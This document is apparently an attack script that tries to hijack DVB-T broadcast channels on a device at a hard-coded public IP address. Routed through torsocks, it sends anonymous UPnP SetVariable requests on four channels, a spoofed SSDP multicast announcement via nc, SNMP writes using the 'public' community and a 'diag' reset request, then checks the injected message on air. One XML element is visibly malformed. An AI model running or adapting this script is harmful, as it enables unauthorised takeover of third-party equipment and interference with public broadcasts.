#!/bin/bash
# TRUSTEDF57 HIJACK - SINGLE FILE 0 ERRORS

TARGET="81.27.245.159:80"
MESSAGE="TRUSTEDF57 SAYS CIAO RAGAZZONI CIAO MASHA"

# UPnP CONTROL XML (anonimo, no login)
XML="<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>services</newVarName><newVal>17105:25:0,$MESSAGE</newVarName></u:SetVariable><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>enable</newVarName><newVal>1</newVal></u:SetVariable><u:SetVariable xmlns:u=\"urn:schemas-upnp-org:service-1-0\"><newVarName>transparent</newVarName><newVal>0</newVal></u:SetVariable></s:Body></s:Envelope>"

# HIJACK TUTTI 4 CANALI
for ch in 0 1 2 3; do
  torsocks curl -s -X POST \
    -H "Content-Type: text/xml; charset=\"utf-8\"" \
    -H "SOAPAction: urn:schemas-upnp-org:service-1-0#SetVariable" \
    --data-binary "$XML" \
    "http://$TARGET/ssdpserv.cgi?type=control&channel=$ch" && \
  echo "✅ CH$ch (506+${ch}*8 MHz): $MESSAGE LIVE!"
done

# SSDP MULTICAST 1900 UDP
torsocks bash -c "echo -e 'NOTIFY * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nNT: urn:terraelectronics-com:service:DVBT_ALL:1\r\nUSN: $MESSAGE\r\nNTS: ssdp:alive\r\nCACHE-CONTROL: max-age=3600\r\nSERVER: TRUSTEDF57/1.0\r\n\r\n' | nc -u 239.255.255.250 1900" &

# SNMP ENABLE (161 UDP)
torsocks snmpset -v1 -c public $TARGET \
  ".1.3.6.1.4.1.30631.1.30.1.1.0.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.1.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.2.1" i 1 \
  ".1.3.6.1.4.1.30631.1.30.1.1.3.1" i 1 &

# Diag reset
torsocks curl -s -X POST -H "Content-Type: text/xml" \
  --data-binary '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetVariable xmlns:u="urn:schemas-upnp-org:service-1-0"><newVarName>diag4114</newVarName><newVal>1</newVal></u:SetVariable></s:Body></s:Envelope>' \
  "http://$TARGET/ssdpserv.cgi?type=control&channel=diag"

wait
echo "🎬 $MESSAGE SU 506/514/522/530 MHz - TUTTI CANALI HIJACKED!"
echo "Verifica: rtl_fm -f 506M -s 2M - | ffplay -f s16le -ar 2M -ac 1 -"
